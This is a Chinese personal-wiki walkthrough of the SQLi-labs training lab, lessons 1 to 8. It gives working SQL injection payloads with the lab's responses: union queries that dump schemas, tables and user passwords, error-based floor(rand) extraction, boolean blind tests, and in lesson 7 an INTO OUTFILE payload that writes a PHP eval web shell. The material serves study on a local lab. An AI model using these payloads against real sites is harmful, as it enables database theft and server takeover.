<!DOCTYPE HTML>
<html>
<head>
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/style.css">
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/tango.css">
    <link rel="shortcut icon" href="/wiki/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/wiki/favicon.ico" type="image/x-icon">
    <title>SQLi-labs环境搭建及学习 - Curtails's personal knowledge wiki</title>
    <meta name="keywords" content="Technology, CTF, Network Security"/>
    <meta name="description" content="A wiki website of Curtails when I learned new knowledgy."/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width" />

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
        });
        </script>
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','','ga');

        ga('create', 'UA-78529611-1', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
<div id="container">
    
<div id="header">
  <div id="post-nav"><a href="/wiki/">Home</a>&nbsp;»&nbsp;<a href="/wiki/#CTF">CTF</a>&nbsp;»&nbsp;SQLi-labs环境搭建及学习</div>
</div>
<div class="clearfix"></div>
<div id="title">SQLi-labs环境搭建及学习</div>
<div id="content">
  <h2 id="_1">环境搭建</h2>
<ul>
<li>花了好久才确定可以使用的php版本及mysql版本</li>
<li>phpstudy <code>Apache2.4.39</code> <code>MySQL5.5.29</code> <code>php5.4.45</code></li>
<li>将sqli-labs放到www 打开网址http://localhost/sqli-labs/ 点击Setup/reset Database for labs 安装即可</li>
</ul>
<h2 id="sql">SQL相关知识</h2>
<p>SQL注释符</p>
<div class="hlcode"><pre><span class="n">SQL</span><span class="err">注释符</span>      <span class="n">URL</span><span class="err">编码</span>
<span class="cp">#               %23</span>
<span class="o">--</span><span class="err">空格</span>            <span class="o">--%</span><span class="mi">20</span> <span class="o">--+</span>
<span class="cm">/*...*/</span>
</pre></div>


<p>SQL 查询信息</p>
<div class="hlcode"><pre><span class="n">version</span><span class="p">()</span>       <span class="err">数据库版本信息</span>
<span class="n">database</span><span class="p">()</span>      <span class="err">数据库名称</span>
<span class="n">user</span><span class="p">()</span>          <span class="err">用户名</span>
</pre></div>


<p>盲注(在不知道数据库返回值的情况下 对数据中的内容进行猜测)</p>
<div class="hlcode"><pre><span class="err">盲注</span>
<span class="err">布尔盲注：页面只返回</span><span class="n">True</span><span class="err">和</span><span class="n">False</span><span class="err">两种类型页面。利用页面返回不同，逐个猜解数据</span>

<span class="err">基于时间的盲注：通过页面沉睡时间判断</span>

<span class="err">报错的盲注：构造</span><span class="n">payload</span><span class="err">让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发</span><span class="n">SQL</span><span class="err">报错机制的注入语句）</span>
</pre></div>


<h2 id="lesson-1-get-error-based-single-quotes-string">Lesson 1 GET-Error based-Single quotes-String</h2>
<p>基于错误-单引号-字符注入</p>
<ul>
<li>
<p>判断是否为数值注入<br />
id=1 成功回显数据<br />
id=1 and 1=1 成功回显数据<br />
id=1 and 1=2 成功回显数据<br />
所以不是数值注入</p>
</li>
<li>
<p>判断是否为字符注入<br />
id=1' 报错<br />
id=1'--+ 成功回显<br />
是字符注入</p>
</li>
<li>
<p>查找字段<br />
id=1' order by 5--+ 回显<code>Unknown column '5' in 'order clause'</code><br />
id=1' order by 3--+ 成功回显 字段为3</p>
</li>
<li>
<p>查询回显点<br />
id=' union select 1,2,3--+ 回显<code>Your Login name:2 Your Password:3</code>说明第二第三字段会显示</p>
</li>
<li>
<p>查询数据库相关信息<br />
id=' union select 1,database(),user()--+ 回显<code>Your Login name:security Your Password:root@localhost</code><br />
id=' union select 1,2,version()--+ 回显<code>Your Login name:2 Your Password:5.5.29</code></p>
</li>
<li>
<p>查询所有数据库<br />
id=' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ 回显<code>Your Login name:information_schema,challenges,mysql,performance_schema,security,test Your Password:3</code></p>
</li>
<li>
<p>查询security数据库的表名<br />
id=' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+ 回显<code>Your Login name:emails,referers,uagents,users Your Password:3</code></p>
</li>
<li>
<p>查询users表中的列名<br />
id=' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+ 回显<code>Your Login name:id,username,password Your Password:3</code></p>
</li>
<li>
<p>查询两个列的数据username与password<br />
id=' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+<br />
回显<code>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></p>
</li>
</ul>
<h2 id="lesson-2-get-error-based-intiger-based">Lesson 2 GET-Error based-Intiger based</h2>
<p>基于错误的数值注入<br />
- 判断是否为数值注入<br />
id=1 成功回显数据<br />
id=1 and 1=1 成功回显数据<br />
id=1 and 1=2 成功执行没有回显数据</p>
<ul>
<li>
<p>查找字段<br />
id=1 order by 3--+</p>
</li>
<li>
<p>查询回显点<br />
id=0 union select 1,2,3--+ 回显<code>Your Login name:2 Your Password:3</code> 后两个字段回显</p>
</li>
<li>
<p>查询数据库相关信息 <br />
id=0 union select 1,database(),version()--+<br />
id=0 union select 1,database(),user()--+</p>
</li>
<li>
<p>查询所有数据库 <br />
id=0 union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ </p>
</li>
<li>查询数据库表名<br />
id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+ </li>
<li>查询users表中的列名<br />
id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+ </li>
<li>查询两个列的数据username与password<br />
id=0 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</li>
</ul>
<h2 id="lesson-3-get-error-based-single-quotes-with-twist-string">Lesson 3 GET-Error based-Single quotes with twist-string</h2>
<p>基于GET错误-单引号变形-字符<br />
- id=1' 报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ' <code>'1'')</code> LIMIT 0,1' at line 1<br />
- 猜测id除了有单引号<code>''</code> 还有<code>()</code><br />
<code>select * from tablename where id=(' ')</code><br />
- id=1') and 1=1--+ 成功回显</p>
<h2 id="lesson-4-get-error-based-double-quotes-string">Lesson 4 GET-Error based-Double Quotes-String</h2>
<p>基于错误-双引号-字符<br />
- id=1'  一个单引号竟然成功回显了 <br />
  id=1'' 两个单引号竟然成功回显了 好吧1'''被当作1执行了<br />
- id=1"  报错for the right syntax to use near ' <code>"3"")</code> LIMIT 0,1' at line 1<br />
- 猜测<code>select * from tablename where id=(" ")</code><br />
- id=1") and 1=1--+ 成功回显</p>
<h2 id="lesson-5-get-double-injection-single-quotes-string"><code>Lesson 5 GET-Double Injection-Single Quotes-String</code></h2>
<p>GET-双注入-单引号-字符<br />
双注入用到的函数/语句</p>
<div class="hlcode"><pre><span class="n">Rand</span><span class="p">()</span>          <span class="err">随机函数</span>
<span class="n">Floor</span><span class="p">()</span>         <span class="err">取整函数</span>
<span class="n">Count</span><span class="p">()</span>         <span class="err">汇总函数</span>
<span class="n">Group</span> <span class="n">by</span> <span class="n">clause</span> <span class="err">分组语句</span>
</pre></div>


<ul>
<li>id=2' and (select 1 from (select count(<em>),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) --+<br />
这里使用了派生表<code>select 1 from a</code> 回显 <code>Subquery returns more than 1 row</code> 实际上这条SQL语句返回一个row 只是字符串长度超过了64位 </li>
<li>使用limit 0,1来控制一个个输出 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）and (select 1 from (select count(<em>),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) --+ 回显<code>Duplicate entry 'information_schema1' for key 'group_key'</code><br />
但是为了使数据输出更清楚 构造语句让报错信息与固定系统语句信息分离 ?id=2' and (select 1 from (select count(<em>),concat(((select concat(schema_name,';') from information_schema.schemata limit 0,1)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) --+ 回显<code>Duplicate entry 'information_schema;1' for key 'group_key'</code> 其中information_schema为真正报错信息为数据库名称</li>
<li>?id=2' and (select 1 from (select count(<em>),concat(((select concat(table_name,';') from information_schema.tables limit 0,1)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) --+ 回显<code>Duplicate entry 'CHARACTER_SETS;1' for key 'group_key'</code></li>
</ul>
<h2 id="lesson-6-get-double-injection-double-quotes-string">Lesson 6 GET-Double Injection-Double Quotes-String</h2>
<p>GET-双注入-双引号-字符串<br />
- 同lesson5 单引号变双引号</p>
<h2 id="lesson-7-get-dump-into-outfile-string">Lesson 7 GET-Dump into outfile-String</h2>
<p>GET-导出文件-字符型<br />
- id=1 回显<code>You are in.... Use outfile......</code><br />
- 判断数值注入 id=1 and 1=2 还是回显<code>You are in.... Use outfile......</code>不是数值注入<br />
- 判断字符注入 id=1' 回显<code>You have an error in your SQL syntax</code>有戏<br />
  id=1'--+   回显<code>You have an error in your SQL syntax</code><br />
  id=1')--+  回显<code>You have an error in your SQL syntax</code><br />
  id=1'))--+ 回显<code>You are in.... Use outfile......</code></p>
<ul>
<li>如果已经绝对路径 可以写入文件 ?id=1')) union select "&lt;?php @eval($_POST['topo']);?&gt;" into outfile "XXX\conn.php" %23 再用蚁剑连接</li>
</ul>
<h2 id="lesson-8-get-blind-boolian-based-single-quotes">Lesson 8 GET-Blind-Boolian Based-Single Quotes</h2>
<p>GET-盲注-基于布尔-单引号<br />
- ?id=1 回显<code>You are in...........</code><br />
  id=0  成功执行无回显</p>
<ul>
<li>id=1' 成功执行无回显<br />
  id=1'%23 成功执行有回显<code>`You are in...........</code><br />
  ?id=1'and 1=2%23 成功执行无回显<br />
  ?id=1'and 1=1%23 成功执行有回显<code>You are in...........</code></li>
</ul>
<p>布尔盲注 成功查询到数据返回true 错误及无数据返回false </p>
</div>
<div id="content-footer">Created in <span class="create-date date"> 2019-10-12 01:01 </span></div>

</div>
<div id="footer">
            <span>
                Copyright © 2019 Curtails.
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
                Fork me in <a href="" target="_blank"> github </a>.
            </span>
</div>


<!--百度统计-->
<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>


</body>
</html>